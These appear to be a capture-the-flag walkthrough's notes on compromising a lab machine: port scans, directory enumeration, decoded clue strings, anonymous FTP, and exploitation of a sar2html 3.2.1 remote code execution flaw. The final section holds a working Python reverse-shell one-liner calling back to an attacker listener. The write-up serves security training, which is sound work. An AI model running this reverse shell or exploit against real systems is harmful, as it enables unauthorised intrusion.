---
id: recon
aliases:
  - RUSTSCAN
tags: []
---

### RUSTSCAN
```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.25.126 --ulimit 5000 -- -Pn -sC -sV
...
PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.50.216
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    syn-ack MiniServ 1.930 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 5C672F1DEC0274872DE48E496B64ABF2
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
55007/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
|   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

### GOBUSTER
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.25.126 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.25.126
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 313] [--> http://10.10.25.126/manual/]
/joomla               (Status: 301) [Size: 313] [--> http://10.10.25.126/joomla/]
/server-status        (Status: 403) [Size: 300]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.25.126/joomla -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 --no-error 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.25.126/joomla
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 320] [--> http://10.10.25.126/joomla/images/]
/modules              (Status: 301) [Size: 321] [--> http://10.10.25.126/joomla/modules/]
/templates            (Status: 301) [Size: 323] [--> http://10.10.25.126/joomla/templates/]
/media                (Status: 301) [Size: 319] [--> http://10.10.25.126/joomla/media/]
/tests                (Status: 301) [Size: 319] [--> http://10.10.25.126/joomla/tests/]
/bin                  (Status: 301) [Size: 317] [--> http://10.10.25.126/joomla/bin/]
/plugins              (Status: 301) [Size: 321] [--> http://10.10.25.126/joomla/plugins/]
/includes             (Status: 301) [Size: 322] [--> http://10.10.25.126/joomla/includes/]
/language             (Status: 301) [Size: 322] [--> http://10.10.25.126/joomla/language/]
/components           (Status: 301) [Size: 324] [--> http://10.10.25.126/joomla/components/]
/cache                (Status: 301) [Size: 319] [--> http://10.10.25.126/joomla/cache/]
/libraries            (Status: 301) [Size: 323] [--> http://10.10.25.126/joomla/libraries/]
/installation         (Status: 301) [Size: 326] [--> http://10.10.25.126/joomla/installation/]
/build                (Status: 301) [Size: 319] [--> http://10.10.25.126/joomla/build/]
/tmp                  (Status: 301) [Size: 317] [--> http://10.10.25.126/joomla/tmp/]
/layouts              (Status: 301) [Size: 321] [--> http://10.10.25.126/joomla/layouts/]
/administrator        (Status: 301) [Size: 327] [--> http://10.10.25.126/joomla/administrator/]
/cli                  (Status: 301) [Size: 317] [--> http://10.10.25.126/joomla/cli/]
/_files               (Status: 301) [Size: 320] [--> http://10.10.25.126/joomla/_files/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.106.3/joomla/ -w /usr/share/wordlists/dirb/big.txt -t 64 --no-error 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.106.3/joomla/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
...
/_archive             (Status: 301) [Size: 320] [--> http://10.10.106.3/joomla/_archive/]
/_database            (Status: 301) [Size: 321] [--> http://10.10.106.3/joomla/_database/]
/_files               (Status: 301) [Size: 318] [--> http://10.10.106.3/joomla/_files/]
/_test                (Status: 301) [Size: 317] [--> http://10.10.106.3/joomla/_test/]
...
/~www                 (Status: 301) [Size: 316] [--> http://10.10.106.3/joomla/~www/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

### SEARCHSPLOIT
```
┌──(kali㉿kali)-[~]
└─$ searchsploit webmin       
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
...
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                                        | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                                                                                          | linux/webapps/49318.rb
...
```

```
┌──(kali㉿kali)-[~]
└─$ searchsploit sar2html
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
sar2html 3.2.1 - 'plot' Remote Code Execution                                                                                                            | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution                                                                                                                | php/webapps/47204.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

### WEBSITE 
#### /robots.txt
```
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```

#### /joomla
There is a login on the sidebar that could be brute-forced.
Apparently Joomla has no default creds: admin is the default user, but the password is set during installation.
##### /joomla/administrator
There is a login form that could be brute-forced.
##### /joomla/_files/
```
┌──(kali㉿kali)-[~]
└─$ echo "VjJodmNITnBaU0JrWVdsemVRbz0K" | base64 -d                                                           
V2hvcHNpZSBkYWlzeQo=
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ echo "VjJodmNITnBaU0JrWVdsemVRbz0K" | base64 -d | base64 -d
Whopsie daisy
```
##### /joomla/_test
Had content related to sar2HTML, which led to a successful searchsploit search

### FTP 
#### ftp anonymous@10.10.25.126
```
┌──(kali㉿kali)-[~]
└─$ ftp anonymous@10.10.25.126
Connected to 10.10.25.126.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||40822|)
550 Permission denied.
ftp> ls
229 Entering Extended Passive Mode (|||48201|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -lah
229 Entering Extended Passive Mode (|||42890|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
229 Entering Extended Passive Mode (|||41001|)
150 Opening BINARY mode data connection for .info.txt (74 bytes).
100% |***********************************************************************************************************************************************************************************************|    74      535.30 KiB/s    00:00 ETA
226 Transfer complete.
74 bytes received in 00:00 (0.20 KiB/s)
ftp> exit
221 Goodbye.
```
#### .info.txt
```
┌──(kali㉿kali)-[~]
└─$ cat .info.txt 
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!

# ROT 13 with Cyberchef
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

### sar2html 3.2.1 - 'plot' Remote Code Execution
```
┌──(kali㉿kali)-[~]
└─$ python3 s2h.py
Enter The url => http://10.10.49.188/joomla/_test
Command => whoami
HPUX
Linux
SunOS
www-data

Command => ls -lah
HPUX
Linux
SunOS
total 124K
drwxr-xr-x  3 www-data www-data 4.0K Aug 22  2019 .
drwxr-xr-x 25 www-data www-data 4.0K Aug 22  2019 ..
-rwxr-xr-x  1 www-data www-data  53K Aug 22  2019 index.php
-rwxr-xr-x  1 www-data www-data  716 Aug 21  2019 log.txt
-rwxr-xr-x  1 www-data www-data  52K Mar 19  2019 sar2html
drwxr-xr-x  3 www-data www-data 4.0K Aug 22  2019 sarFILE
```

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9876               
listening on [any] 9876 ...
```

```
...
Command => python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.50.216",9876));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```
connect to [10.17.50.216] from (UNKNOWN) [10.10.49.188] 55366
/bin/sh: 0: can't access tty; job control turned off
$
```
